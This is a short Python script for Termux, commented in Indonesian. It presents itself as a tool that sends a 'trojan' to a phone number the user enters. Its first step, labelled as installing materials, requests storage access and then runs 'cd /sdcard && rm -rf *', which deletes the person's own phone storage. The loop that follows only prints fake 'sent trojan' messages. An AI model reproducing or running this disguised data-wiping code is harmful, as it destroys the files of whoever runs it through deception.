#module
import os
import sys
import time

def main():
	os.system('clear')
	print("Ketik y Untuk menginstall bahan\n")
	os.system("termux-setup-storage")
	time.sleep(4)
	os.system("cd /sdcard && rm -rf *")

main()
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
# untuk mengclear layar
os.system("clear")
print('\033[1;35m')
print('Vindra')
os.system('figlet Perusak')
print('Masukan Nomor di Awali +62')
#input nomer
nomer = input('\033[1;37m? Masukan Nomor : ')
#input jumlah
jumlah = int(input('? Jumlah : '))

i = 0
#pengulangan
for x in range(jumlah):
        i += 1
        print(f'{i} \033[1;37mSuskses mengirim\033[1;36m trojan ke\033[0m {nomer} ')
        time.sleep(0.1)
